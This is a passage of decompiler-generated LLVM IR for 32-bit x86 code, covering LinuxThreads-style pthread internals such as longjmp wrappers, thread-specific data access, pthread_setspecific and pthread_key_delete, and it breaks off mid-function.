define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f1d2 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804f1dc = call i32 @pthread_cleanup_upto(i32 %v0_804f1d2)
  %v0_804f1e7 = load i32, i32* @ebx, align 4
  %v4_804f1e8 = call i32 @_longjmp(i32 %v0_804f1e7, i32 %arg2, i32 %v1_804f1dc, i32 %v1_804f1dc)
  ret i32 %v4_804f1e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804f1ed = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804f1f7 = call i32 @pthread_cleanup_upto(i32 %v0_804f1ed)
  %v0_804f1fc = load i32, i32* @edx, align 4
  %v0_804f202 = load i32, i32* @ebx, align 4
  %v4_804f203 = call i32 @_longjmp(i32 %v0_804f202, i32 %arg2, i32 %v0_804f1fc, i32 %v0_804f1fc)
  ret i32 %v4_804f203

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 (i32)* @pthread_cleanup_upto, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @thread_self.19(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804f20f = load i32, i32* @esp, align 4
  %v1_804f20f = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804f20f = icmp ult i32 %v0_804f20f, %v1_804f20f
  %v1_804f215 = icmp eq i1 %v7_804f20f, false
  br i1 %v1_804f215, label %dec_label_pc_804f246, label %dec_label_pc_804f217

dec_label_pc_804f217:                             ; preds = %entry
  %v1_804f217 = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804f217 = icmp ult i32 %v0_804f20f, %v1_804f217
  br i1 %v7_804f217, label %dec_label_pc_804f22c, label %dec_label_pc_804f21f

dec_label_pc_804f21f:                             ; preds = %dec_label_pc_804f217
  %v1_804f224 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804f224 = icmp ult i32 %v0_804f20f, %v1_804f224
  br i1 %v7_804f224, label %dec_label_pc_804f246, label %dec_label_pc_804f22c

dec_label_pc_804f22c:                             ; preds = %dec_label_pc_804f21f, %dec_label_pc_804f217
  %v0_804f22c = load i32, i32* @global_var_8067650.138, align 16
  %v1_804f22c = icmp eq i32 %v0_804f22c, 0
  br i1 %v1_804f22c, label %dec_label_pc_804f23a, label %dec_label_pc_804f235

dec_label_pc_804f235:                             ; preds = %dec_label_pc_804f22c
  %v0_804f235 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804f23a

dec_label_pc_804f23a:                             ; preds = %dec_label_pc_804f22c, %dec_label_pc_804f235
  %v2_804f240 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804f246

dec_label_pc_804f246:                             ; preds = %dec_label_pc_804f21f, %entry, %dec_label_pc_804f23a
  %v0_804f246 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804f21f ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804f240, %dec_label_pc_804f23a ]
  ret i32 %v0_804f246

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8062320 to i32), { 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_8062500.136 to i32), { 0, 1, 11, 2, 3, 4, 5, 12, 13, 6, 7, 8, 9, 10 }
  uselistorder i32 ()* @__pthread_find_self, { 6, 0, 3, 5, 8, 4, 7, 2, 10, 9, 1 }
  uselistorder label %dec_label_pc_804f246, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f23a, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f24a = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_804f258 = mul i32 %arg1, 4
  %v3_804f258 = add i32 %v2_804f258, 364
  %v4_804f258 = add i32 %v3_804f258, %v1_804f24a
  ret i32 %v4_804f258
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f263 = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_804f26c = mul i32 %arg1, 4
  %v3_804f26c = add i32 %v2_804f26c, 364
  %v4_804f26c = add i32 %v3_804f26c, %v1_804f263
  %v5_804f26c = inttoptr i32 %v4_804f26c to i32*
  %v6_804f26c = load i32, i32* %v5_804f26c, align 4
  ret i32 %v6_804f26c
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f27a = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v3_804f287 = mul i32 %arg1, 4
  %v4_804f287 = add i32 %v3_804f287, 364
  %v5_804f287 = add i32 %v4_804f287, %v1_804f27a
  %v6_804f287 = inttoptr i32 %v5_804f287 to i32*
  store i32 %arg2, i32* %v6_804f287, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 2, 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f294 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v6_804f2a2 = icmp ugt i32 %arg1, 1023
  br i1 %v6_804f2a2, label %dec_label_pc_804f2cb, label %dec_label_pc_804f2a4

dec_label_pc_804f2a4:                             ; preds = %entry
  %v1_804f2a4 = call i32 @thread_self.19(i32 %v0_804f294)
  %v0_804f2a9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f2ab = udiv i32 %v0_804f2a9, 32
  %v2_804f2ae = mul nuw nsw i32 %v2_804f2ab, 4
  %v3_804f2ae = add i32 %v1_804f2a4, 236
  %v4_804f2ae = add i32 %v3_804f2ae, %v2_804f2ae
  %v5_804f2ae = inttoptr i32 %v4_804f2ae to i32*
  %v6_804f2ae = load i32, i32* %v5_804f2ae, align 4
  %v1_804f2b5 = icmp eq i32 %v6_804f2ae, 0
  br i1 %v1_804f2b5, label %dec_label_pc_804f2cb, label %dec_label_pc_804f2b9

dec_label_pc_804f2b9:                             ; preds = %dec_label_pc_804f2a4
  %v1_804f2b9 = mul i32 %v0_804f2a9, 8
  %v2_804f2b9 = add i32 %v1_804f2b9, ptrtoint (i32* @global_var_8063040.199 to i32)
  %v3_804f2b9 = inttoptr i32 %v2_804f2b9 to i32*
  %v4_804f2b9 = load i32, i32* %v3_804f2b9, align 8
  %v5_804f2b9 = icmp eq i32 %v4_804f2b9, 0
  br i1 %v5_804f2b9, label %dec_label_pc_804f2cb, label %dec_label_pc_804f2c3

dec_label_pc_804f2c3:                             ; preds = %dec_label_pc_804f2b9
  %v1_804f2c3 = urem i32 %v0_804f2a9, 32
  store i32 %v1_804f2c3, i32* %ebx.global-to-local, align 4
  %v2_804f2c6 = mul nuw nsw i32 %v1_804f2c3, 4
  %v3_804f2c6 = add i32 %v2_804f2c6, %v6_804f2ae
  %v4_804f2c6 = inttoptr i32 %v3_804f2c6 to i32*
  %v5_804f2c6 = load i32, i32* %v4_804f2c6, align 4
  br label %dec_label_pc_804f2cd

dec_label_pc_804f2cb:                             ; preds = %dec_label_pc_804f2b9, %dec_label_pc_804f2a4, %entry
  br label %dec_label_pc_804f2cd

dec_label_pc_804f2cd:                             ; preds = %dec_label_pc_804f2c3, %dec_label_pc_804f2cb
  %storemerge = phi i32 [ %v5_804f2c6, %dec_label_pc_804f2c3 ], [ 0, %dec_label_pc_804f2cb ]
  store i32 %v0_804f294, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f2c3, { 1, 0 }
  uselistorder i32 %v0_804f2a9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f2cd, { 1, 0 }
}

define i32 @__pthread_destroy_specifics() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804f2d1 = load i32, i32* @ebp, align 4
  %v0_804f2d2 = load i32, i32* @edi, align 4
  %v0_804f2d3 = load i32, i32* @esi, align 4
  %v0_804f2d4 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804f2da = call i32 @thread_self.19(i32 %v0_804f2d4)
  store i32 %v1_804f2da, i32* @esi, align 4
  %v4_804f3434 = icmp eq i32 %tmp, 0
  br i1 %v4_804f3434, label %dec_label_pc_804f35b, label %dec_label_pc_804f34a.lr.ph

dec_label_pc_804f34a.lr.ph:                       ; preds = %entry
  %v0_804f34a.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f34a

dec_label_pc_804f2eb:                             ; preds = %dec_label_pc_804f34f, %dec_label_pc_804f33c
  %stack_var_-24.339 = phi i32 [ %stack_var_-24.411, %dec_label_pc_804f34f ], [ %stack_var_-24.2, %dec_label_pc_804f33c ]
  %v0_804f33c.pre34 = phi i32 [ 0, %dec_label_pc_804f34f ], [ %v1_804f33c, %dec_label_pc_804f33c ]
  store i32 0, i32* @edi, align 4
  %v0_804f2ed = load i32, i32* @esi, align 4
  %v2_804f2ed = mul i32 %v0_804f33c.pre34, 4
  %v3_804f2ed = add i32 %v2_804f2ed, 236
  %v4_804f2ed = add i32 %v3_804f2ed, %v0_804f2ed
  %v5_804f2ed = inttoptr i32 %v4_804f2ed to i32*
  %v6_804f2ed = load i32, i32* %v5_804f2ed, align 4
  %v7_804f2ed = icmp eq i32 %v6_804f2ed, 0
  %v1_804f2f5 = icmp eq i1 %v7_804f2ed, false
  br i1 %v1_804f2f5, label %dec_label_pc_804f337.preheader, label %dec_label_pc_804f33c

dec_label_pc_804f337.preheader:                   ; preds = %dec_label_pc_804f2eb
  br label %dec_label_pc_804f2f9

dec_label_pc_804f2f9:                             ; preds = %dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge, %dec_label_pc_804f337.preheader
  %v1_804f30e = phi i32 [ %v0_804f2ed, %dec_label_pc_804f337.preheader ], [ %v1_804f30e.pre, %dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge ]
  %v0_804f33c.pre37 = phi i32 [ %v0_804f33c.pre34, %dec_label_pc_804f337.preheader ], [ %v0_804f33c.pre, %dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge ]
  %stack_var_-24.136 = phi i32 [ %stack_var_-24.339, %dec_label_pc_804f337.preheader ], [ %stack_var_-24.0, %dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge ]
  %v0_804f30735 = phi i32 [ 0, %dec_label_pc_804f337.preheader ], [ %v1_804f336, %dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge ]
  %v2_804f2fb = mul i32 %v0_804f33c.pre37, 32
  %v2_804f2fe = add i32 %v2_804f2fb, %v0_804f30735
  %v1_804f300 = mul i32 %v2_804f2fe, 8
  %v2_804f300 = add i32 %v1_804f300, ptrtoint (i32* @global_var_8063044.200 to i32)
  %v3_804f300 = inttoptr i32 %v2_804f300 to i32*
  %v4_804f300 = load i32, i32* %v3_804f300, align 4
  %v1_804f315 = icmp eq i32 %v4_804f300, 0
  br i1 %v1_804f315, label %dec_label_pc_804f336, label %dec_label_pc_804f31b

dec_label_pc_804f31b:                             ; preds = %dec_label_pc_804f2f9
  %v3_804f30e = mul i32 %v0_804f33c.pre37, 4
  %v4_804f30e = add i32 %v3_804f30e, 236
  %v5_804f30e = add i32 %v4_804f30e, %v1_804f30e
  %v6_804f30e = inttoptr i32 %v5_804f30e to i32*
  %v7_804f30e = load i32, i32* %v6_804f30e, align 4
  %v1_804f307 = mul i32 %v0_804f30735, 4
  %v8_804f30e = add i32 %v7_804f30e, %v1_804f307
  %v1_804f317 = inttoptr i32 %v8_804f30e to i32*
  store i32 0, i32* %v1_804f317, align 4
  call void @__pseudo_call(i32 %v4_804f300)
  %v0_804f336.pre = load i32, i32* @edi, align 4
  %v0_804f33c.pre.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f336

dec_label_pc_804f336:                             ; preds = %dec_label_pc_804f2f9, %dec_label_pc_804f31b
  %v0_804f33c.pre = phi i32 [ %v0_804f33c.pre37, %dec_label_pc_804f2f9 ], [ %v0_804f33c.pre.pre, %dec_label_pc_804f31b ]
  %v0_804f336 = phi i32 [ %v0_804f30735, %dec_label_pc_804f2f9 ], [ %v0_804f336.pre, %dec_label_pc_804f31b ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.136, %dec_label_pc_804f2f9 ], [ 1, %dec_label_pc_804f31b ]
  %v1_804f336 = add i32 %v0_804f336, 1
  store i32 %v1_804f336, i32* @edi, align 4
  %v7_804f33a = icmp sgt i32 %v1_804f336, 31
  br i1 %v7_804f33a, label %dec_label_pc_804f33c, label %dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge

dec_label_pc_804f336.dec_label_pc_804f2f9_crit_edge: ; preds = %dec_label_pc_804f336
  %v1_804f30e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f2f9

dec_label_pc_804f33c:                             ; preds = %dec_label_pc_804f336, %dec_label_pc_804f2eb
  %v0_804f33c = phi i32 [ %v0_804f33c.pre34, %dec_label_pc_804f2eb ], [ %v0_804f33c.pre, %dec_label_pc_804f336 ]
  %stack_var_-24.2 = phi i32 [ %stack_var_-24.339, %dec_label_pc_804f2eb ], [ %stack_var_-24.0, %dec_label_pc_804f336 ]
  %v1_804f33c = add i32 %v0_804f33c, 1
  store i32 %v1_804f33c, i32* @ebx, align 4
  %v7_804f340 = icmp sgt i32 %v1_804f33c, 31
  br i1 %v7_804f340, label %dec_label_pc_804f342, label %dec_label_pc_804f2eb

dec_label_pc_804f342:                             ; preds = %dec_label_pc_804f33c
  %v0_804f342 = load i32, i32* @ebp, align 4
  %v1_804f342 = add i32 %v0_804f342, 1
  store i32 %v1_804f342, i32* @ebp, align 4
  %v4_804f343 = icmp eq i32 %stack_var_-24.2, 0
  br i1 %v4_804f343, label %dec_label_pc_804f35b.loopexit, label %dec_label_pc_804f34a

dec_label_pc_804f34a:                             ; preds = %dec_label_pc_804f34a.lr.ph, %dec_label_pc_804f342
  %v0_804f34a = phi i32 [ %v0_804f34a.pre, %dec_label_pc_804f34a.lr.ph ], [ %v1_804f342, %dec_label_pc_804f342 ]
  %stack_var_-24.411 = phi i32 [ %tmp, %dec_label_pc_804f34a.lr.ph ], [ %stack_var_-24.2, %dec_label_pc_804f342 ]
  %stack_var_-20.012 = phi i32 [ 1, %dec_label_pc_804f34a.lr.ph ], [ 0, %dec_label_pc_804f342 ]
  %v1_804f34a = add i32 %v0_804f34a, -3
  %v6_804f34a = sub i32 2, %v0_804f34a
  %v7_804f34a = and i32 %v6_804f34a, %v0_804f34a
  %v8_804f34a = icmp slt i32 %v7_804f34a, 0
  %v9_804f34a = icmp eq i32 %v1_804f34a, 0
  %v10_804f34a = icmp slt i32 %v1_804f34a, 0
  %v3_804f34d = icmp eq i1 %v10_804f34a, %v8_804f34a
  %v4_804f34d = icmp eq i1 %v9_804f34a, false
  %v5_804f34d = and i1 %v4_804f34d, %v3_804f34d
  br i1 %v5_804f34d, label %dec_label_pc_804f35b.loopexit, label %dec_label_pc_804f34f

dec_label_pc_804f34f:                             ; preds = %dec_label_pc_804f34a
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804f2eb

dec_label_pc_804f35b.loopexit:                    ; preds = %dec_label_pc_804f34a, %dec_label_pc_804f342
  %stack_var_-20.0.lcssa.ph = phi i32 [ 0, %dec_label_pc_804f342 ], [ %stack_var_-20.012, %dec_label_pc_804f34a ]
  %v0_804f35b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f35b

dec_label_pc_804f35b:                             ; preds = %dec_label_pc_804f35b.loopexit, %entry
  %v0_804f35b = phi i32 [ %v1_804f2da, %entry ], [ %v0_804f35b.pre, %dec_label_pc_804f35b.loopexit ]
  %stack_var_-20.0.lcssa = phi i32 [ 1, %entry ], [ %stack_var_-20.0.lcssa.ph, %dec_label_pc_804f35b.loopexit ]
  %v1_804f35b = add i32 %v0_804f35b, 28
  %v2_804f35b = inttoptr i32 %v1_804f35b to i32*
  %v3_804f35b = load i32, i32* %v2_804f35b, align 4
  store i32 %v3_804f35b, i32* @eax, align 4
  store i32 %v0_804f35b, i32* @edx, align 4
  %v1_804f360 = call i32 @__pthread_lock(i32 %stack_var_-20.0.lcssa)
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804f369

dec_label_pc_804f369:                             ; preds = %dec_label_pc_804f35b, %dec_label_pc_804f38b
  %v1_804f36933 = phi i32 [ 0, %dec_label_pc_804f35b ], [ %v1_804f38b, %dec_label_pc_804f38b ]
  %v0_804f369 = load i32, i32* @esi, align 4
  %v2_804f369 = mul i32 %v1_804f36933, 4
  %v3_804f369 = add i32 %v2_804f369, 236
  %v4_804f369 = add i32 %v3_804f369, %v0_804f369
  %v5_804f369 = inttoptr i32 %v4_804f369 to i32*
  %v6_804f369 = load i32, i32* %v5_804f369, align 4
  %v1_804f370 = icmp eq i32 %v6_804f369, 0
  br i1 %v1_804f370, label %dec_label_pc_804f38b, label %dec_label_pc_804f374

dec_label_pc_804f374:                             ; preds = %dec_label_pc_804f369
  %v1_804f378 = call i32 @free(i32 %v6_804f369)
  %v0_804f37d = load i32, i32* @esi, align 4
  %v1_804f37d = load i32, i32* @ebx, align 4
  %v2_804f37d = mul i32 %v1_804f37d, 4
  %v3_804f37d = add i32 %v0_804f37d, 236
  %v4_804f37d = add i32 %v3_804f37d, %v2_804f37d
  %v5_804f37d = inttoptr i32 %v4_804f37d to i32*
  store i32 0, i32* %v5_804f37d, align 4
  %v0_804f38b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f38b

dec_label_pc_804f38b:                             ; preds = %dec_label_pc_804f369, %dec_label_pc_804f374
  %v0_804f38b = phi i32 [ %v1_804f36933, %dec_label_pc_804f369 ], [ %v0_804f38b.pre, %dec_label_pc_804f374 ]
  %v1_804f38b = add i32 %v0_804f38b, 1
  store i32 %v1_804f38b, i32* @ebx, align 4
  %v7_804f38f = icmp sgt i32 %v1_804f38b, 31
  br i1 %v7_804f38f, label %dec_label_pc_804f391, label %dec_label_pc_804f369

dec_label_pc_804f391:                             ; preds = %dec_label_pc_804f38b
  %v0_804f394 = load i32, i32* @esi, align 4
  %v1_804f394 = add i32 %v0_804f394, 28
  %v2_804f394 = inttoptr i32 %v1_804f394 to i32*
  %v3_804f394 = load i32, i32* %v2_804f394, align 4
  %v1_804f397 = inttoptr i32 %v3_804f394 to i32*
  %v2_804f397 = call i32 @__pthread_unlock(i32* %v1_804f397)
  store i32 %v0_804f2d4, i32* @ebx, align 4
  store i32 %v0_804f2d3, i32* @esi, align 4
  store i32 %v0_804f2d2, i32* @edi, align 4
  store i32 %v0_804f2d1, i32* @ebp, align 4
  ret i32 %v2_804f397

; uselistorder directives
  uselistorder i32 %v1_804f38b, { 1, 0, 2 }
  uselistorder i32 %v1_804f36933, { 1, 0 }
  uselistorder i32 %v0_804f35b, { 1, 0 }
  uselistorder i32 %v1_804f34a, { 1, 0 }
  uselistorder i32 %v0_804f34a, { 0, 2, 1 }
  uselistorder i32 %v1_804f33c, { 1, 0, 2 }
  uselistorder i32 %v1_804f336, { 0, 2, 1 }
  uselistorder i32 %v4_804f300, { 1, 0 }
  uselistorder i32 %v0_804f30735, { 1, 0, 2 }
  uselistorder i32 %v0_804f33c.pre37, { 1, 2, 0 }
  uselistorder i32 %v0_804f33c.pre34, { 2, 0, 1 }
  uselistorder i32 (i32*)* @__pthread_unlock, { 50, 49, 7, 8, 9, 10, 42, 43, 45, 46, 47, 48, 3, 44, 11, 37, 12, 13, 4, 41, 38, 14, 15, 16, 17, 18, 19, 20, 21, 22, 39, 40, 23, 24, 25, 26, 27, 28, 29, 31, 32, 5, 33, 30, 34, 0, 1, 2, 36, 35, 6 }
  uselistorder i32 (i32)* @__pthread_lock, { 6, 1, 0, 29, 28, 27, 5, 3, 2, 33, 4, 26, 10, 25, 24, 32, 7, 9, 23, 22, 21, 20, 8, 19, 18, 17, 15, 31, 14, 16, 13, 35, 34, 11, 12, 30 }
  uselistorder label %dec_label_pc_804f38b, { 1, 0 }
  uselistorder label %dec_label_pc_804f369, { 1, 0 }
  uselistorder label %dec_label_pc_804f34a, { 1, 0 }
  uselistorder label %dec_label_pc_804f336, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f3a6 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804f3b1 = icmp ugt i32 %arg1, 1023
  br i1 %v6_804f3b1, label %dec_label_pc_804f408, label %dec_label_pc_804f3b3

dec_label_pc_804f3b3:                             ; preds = %entry
  %v1_804f3b3 = mul i32 %arg1, 8
  %v2_804f3b3 = add i32 %v1_804f3b3, ptrtoint (i32* @global_var_8063040.199 to i32)
  %v3_804f3b3 = inttoptr i32 %v2_804f3b3 to i32*
  %v4_804f3b3 = load i32, i32* %v3_804f3b3, align 8
  %v5_804f3b3 = icmp eq i32 %v4_804f3b3, 0
  br i1 %v5_804f3b3, label %dec_label_pc_804f408, label %dec_label_pc_804f3bd

dec_label_pc_804f3bd:                             ; preds = %dec_label_pc_804f3b3
  %v1_804f3bd = call i32 @thread_self.19(i32 %v0_804f3a6)
  %v0_804f3c2 = load i32, i32* @ebx, align 4
  %v2_804f3c4 = udiv i32 %v0_804f3c2, 32
  store i32 %v2_804f3c4, i32* @esi, align 4
  store i32 %v1_804f3bd, i32* @edi, align 4
  %v2_804f3c9 = mul nuw nsw i32 %v2_804f3c4, 4
  %v3_804f3c9 = add i32 %v1_804f3bd, 236
  %v4_804f3c9 = add i32 %v3_804f3c9, %v2_804f3c9
  %v5_804f3c9 = inttoptr i32 %v4_804f3c9 to i32*
  %v6_804f3c9 = load i32, i32* %v5_804f3c9, align 4
  %v7_804f3c9 = icmp eq i32 %v6_804f3c9, 0
  %v1_804f3d1 = icmp eq i1 %v7_804f3c9, false
  br i1 %v1_804f3d1, label %dec_label_pc_804f3f3, label %dec_label_pc_804f3d3

dec_label_pc_804f3d3:                             ; preds = %dec_label_pc_804f3bd
  %v5_804f3d9 = call i32 @calloc(i64 32, i32 4, i32 %v1_804f3bd, i32 %v1_804f3bd)
  %v1_804f3e8 = icmp eq i32 %v5_804f3d9, 0
  br i1 %v1_804f3e8, label %dec_label_pc_804f40d, label %dec_label_pc_804f3ec

dec_label_pc_804f3ec:                             ; preds = %dec_label_pc_804f3d3
  %v1_804f3ec = load i32, i32* @edi, align 4
  %v2_804f3ec = load i32, i32* @esi, align 4
  %v3_804f3ec = mul i32 %v2_804f3ec, 4
  %v4_804f3ec = add i32 %v1_804f3ec, 236
  %v5_804f3ec = add i32 %v4_804f3ec, %v3_804f3ec
  %v6_804f3ec = inttoptr i32 %v5_804f3ec to i32*
  store i32 %v5_804f3d9, i32* %v6_804f3ec, align 4
  %v0_804f3f3.pre = load i32, i32* @ebx, align 4
  %v0_804f3f6.pre = load i32, i32* @edi, align 4
  %v1_804f3f6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f3f3

dec_label_pc_804f3f3:                             ; preds = %dec_label_pc_804f3bd, %dec_label_pc_804f3ec
  %v1_804f3f6 = phi i32 [ %v2_804f3c4, %dec_label_pc_804f3bd ], [ %v1_804f3f6.pre, %dec_label_pc_804f3ec ]
  %v0_804f3f6 = phi i32 [ %v1_804f3bd, %dec_label_pc_804f3bd ], [ %v0_804f3f6.pre, %dec_label_pc_804f3ec ]
  %v0_804f3f3 = phi i32 [ %v0_804f3c2, %dec_label_pc_804f3bd ], [ %v0_804f3f3.pre, %dec_label_pc_804f3ec ]
  %v1_804f3f3 = urem i32 %v0_804f3f3, 32
  %v2_804f3f6 = mul i32 %v1_804f3f6, 4
  %v3_804f3f6 = add i32 %v0_804f3f6, 236
  %v4_804f3f6 = add i32 %v3_804f3f6, %v2_804f3f6
  %v5_804f3f6 = inttoptr i32 %v4_804f3f6 to i32*
  %v6_804f3f6 = load i32, i32* %v5_804f3f6, align 4
  %v3_804f401 = mul nuw nsw i32 %v1_804f3f3, 4
  %v4_804f401 = add i32 %v3_804f401, %v6_804f3f6
  %v5_804f401 = inttoptr i32 %v4_804f401 to i32*
  store i32 %arg2, i32* %v5_804f401, align 4
  br label %dec_label_pc_804f40d

dec_label_pc_804f408:                             ; preds = %dec_label_pc_804f3b3, %entry
  br label %dec_label_pc_804f40d

dec_label_pc_804f40d:                             ; preds = %dec_label_pc_804f3d3, %dec_label_pc_804f3f3, %dec_label_pc_804f408
  %v0_804f410 = phi i32 [ 12, %dec_label_pc_804f3d3 ], [ 0, %dec_label_pc_804f3f3 ], [ 22, %dec_label_pc_804f408 ]
  ret i32 %v0_804f410

; uselistorder directives
  uselistorder i32 %v5_804f3d9, { 1, 0 }
  uselistorder i32 %v2_804f3c4, { 2, 1, 0 }
  uselistorder i32 %v0_804f3c2, { 1, 0 }
  uselistorder i32 %v1_804f3bd, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804f40d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f3f3, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8065040.201 to i32), i32* %stack_var_-28, align 4
  %v1_804f41f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065040.201 to i32))
  %v0_804f427 = load i32, i32* @ebx, align 4
  %v6_804f42d = icmp ugt i32 %v0_804f427, 1023
  br i1 %v6_804f42d, label %dec_label_pc_804f439, label %dec_label_pc_804f42f

dec_label_pc_804f42f:                             ; preds = %entry
  %v1_804f42f = mul i32 %v0_804f427, 8
  %v2_804f42f = add i32 %v1_804f42f, ptrtoint (i32* @global_var_8063040.199 to i32)
  %v3_804f42f = inttoptr i32 %v2_804f42f to i32*
  %v4_804f42f = load i32, i32* %v3_804f42f, align 8
  %v5_804f42f = icmp eq i32 %v4_804f42f, 0
  %v1_804f437 = icmp eq i1 %v5_804f42f, false
  br i1 %v1_804f437, label %dec_label_pc_804f44d, label %dec_label_pc_804f439

dec_label_pc_804f439:                             ; preds = %dec_label_pc_804f42f, %entry
  store i32 ptrtoint (i32* @global_var_8065040.201 to i32), i32* %stack_var_-28, align 4
  %v1_804f441 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8065040.201 to i32))
  br label %dec_label_pc_804f4a8

dec_label_pc_804f44d:                             ; preds = %dec_label_pc_804f42f
  store i32 0, i32* %v3_804f42f, align 8
  %v0_804f458 = load i32, i32* @ebx, align 4
  %v1_804f458 = mul i32 %v0_804f458, 8
  %v2_804f458 = add i32 %v1_804f458, ptrtoint (i32* @global_var_8063044.200 to i32)
  %v3_804f458 = inttoptr i32 %v2_804f458 to i32*
  store i32 0, i32* %v3_804f458, align 4
  %v0_804f463 = load i32, i32* @global_var_80626e4.143, align 4
  %v10_804f463 = icmp eq i32 %v0_804f463, -1
  br i1 %v10_804f463, label %dec_label_pc_804f499, label %dec_label_pc_804f46c

dec_label_pc_804f46c:                             ; preds = %dec_label_pc_804f44d
  %v0_804f46c = load i32, i32* %stack_var_-28, align 4
  %v1_804f46c = call i32 @thread_self.19(i32 %v0_804f46c)
  %v0_804f471 = load i32, i32* @ebx, align 4
  %v2_804f473 = udiv i32 %v0_804f471, 32
  store i32 %v2_804f473, i32* @esi, align 4
  %v1_804f476 = urem i32 %v0_804f471, 32
  store i32 %v1_804f476, i32* @ebx, align 4
  store i32 %v1_804f46c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f47b

dec_label_pc_804f47b:                             ; preds = %dec_label_pc_804f493, %dec_label_pc_804f46c
  %v0_804f481 = phi i32 [ %v2_804f493, %dec_label_pc_804f493 ], [ %v1_804f46c, %dec_label_pc_804f46c ]
  %v1_804f47b = add i32 %v0_804f481, 44
  %v2_804f47b = inttoptr i32 %v1_804f47b to i8*
  %v3_804f47b = load i8, i8* %v2_804f47b, align 1
  %v4_804f47b = icmp eq i8 %v3_804f47b, 0
  %v1_804f47f = icmp eq i1 %v4_804f47b, false
  br i1 %v1_804f47f, label %dec_label_pc_804f493, label %dec_label_pc_804f481

dec_label_pc_804f481:                             ; preds = %dec_label_pc_804f47b
  %v1_804f481 = load i32, i32* @esi, align 4
  %v2_804f481 = mul i32 %v1_804f481, 4
  %v3_804f481 = add i32 %v0_804f481, 236
  %v4_804f481 = add i32 %v3_804f481, %v2_804f481
  %v5_804f481 = inttoptr i32 %v4_804f481 to i32*
  %v6_804f481 = load i32, i32* %v5_804f481, align 4
  %v1_804f488 = icmp eq i32 %v6_804f481, 0
  br i1 %v1_804f488, label %dec_label_pc_804f493, label %dec_label_pc_804f48c

dec_label_pc_804f48c:                             ; preds = %dec_label_pc_804f481
  %v1_804f48c = load i32, i32* @ebx, align 4
  %v2_804f48c = mul i32 %v1_804f48c, 4
  %v3_804f48c = add i32 %v2_804f48c, %v6_804f481
  %v4_804f48c = inttoptr i32 %v3_804f48c to i32*
  store i32 0, i32* %v4_804f48c, align 4
  %v0_804f493.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f493

